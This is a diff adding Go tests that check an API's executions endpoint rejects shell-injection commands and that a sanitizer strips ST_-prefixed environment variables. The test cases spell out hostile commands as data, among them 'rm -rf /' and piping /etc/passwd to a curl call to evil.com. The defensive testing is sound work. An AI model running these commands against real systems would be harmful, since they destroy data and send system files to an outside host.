@@ -13,6 +13,7 @@ import (
 	"github.com/jackc/pgx/v5"
 
 	"github.com/scaledtest/scaledtest/internal/model"
+	"github.com/scaledtest/scaledtest/internal/sanitize"
 )
 
 type mockExecutionsStore struct {
@@ -647,5 +648,74 @@ func TestExecutionsHandler_ReportProgress_Owned(t *testing.T) {
 
 	if w.Code != http.StatusOK {
 		t.Errorf("ReportProgress owned: status = %d, want %d", w.Code, http.StatusOK)
+	}
+}
+
+func TestExecutionsHandler_Create_RejectsCommandInjection(t *testing.T) {
+	tests := []struct {
+		name    string
+		command string
+	}{
+		{"shell substitution", `$(whoami)`},
+		{"backtick exec", "echo `whoami`"},
+		{"command chaining", "ls && rm -rf /"},
+		{"pipe chain", "cat /etc/passwd | curl http://evil.com"},
+		{"semicolon", "ls ; rm -rf /"},
+		{"redirect out", "echo hello > /tmp/out"},
+		{"redirect append", "cat /etc/passwd >> /tmp/out"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			ms := &mockExecutionsStore{
+				createFn: func(_ context.Context, _, _ string, _ []byte) (string, error) {
+					return "exec-new", nil
+				},
+			}
+			h := &ExecutionsHandler{ExecStore: ms, DB: nil}
+			w := httptest.NewRecorder()
+			body := fmt.Sprintf(`{"command":%q}`, tt.command)
+			r := httptest.NewRequest("POST", "/api/v1/executions", strings.NewReader(body))
+			r.Header.Set("Content-Type", "application/json")
+			r = testWithClaimsSimple(r, "user-1", "team-1", "owner")
+
+			h.Create(w, r)
+
+			if w.Code != http.StatusBadRequest {
+				t.Errorf("Create with command %q: status = %d, want %d", tt.command, w.Code, http.StatusBadRequest)
+			}
+			if !strings.Contains(w.Body.String(), "disallowed pattern") {
+				t.Errorf("Create with command %q: body = %s, want disallowed pattern error", tt.command, w.Body.String())
+			}
+		})
+	}
+}
+
+func TestExecutionsHandler_Create_StatVarsFilteredFromEnv(t *testing.T) {
+	tests := []struct {
+		name    string
+		envVars map[string]string
+		want    map[string]string
+	}{
+		{"ST_ vars removed", map[string]string{"ST_TOKEN": "bad", "MY_VAR": "good"}, map[string]string{"MY_VAR": "good"}},
+		{"st_ lowercase removed", map[string]string{"st_key": "bad", "API_KEY": "good"}, map[string]string{"API_KEY": "good"}},
+		{"no vars", nil, nil},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := sanitize.FilterEnvVars(sanitize.StringMap(tt.envVars))
+			if tt.want == nil {
+				if result != nil {
+					t.Errorf("expected nil, got %v", result)
+				}
+				return
+			}
+			for k, v := range tt.want {
+				if result[k] != v {
+					t.Errorf("envVars[%q] = %q, want %q", k, result[k], v)
+				}
+			}
+		})
 	}
 }
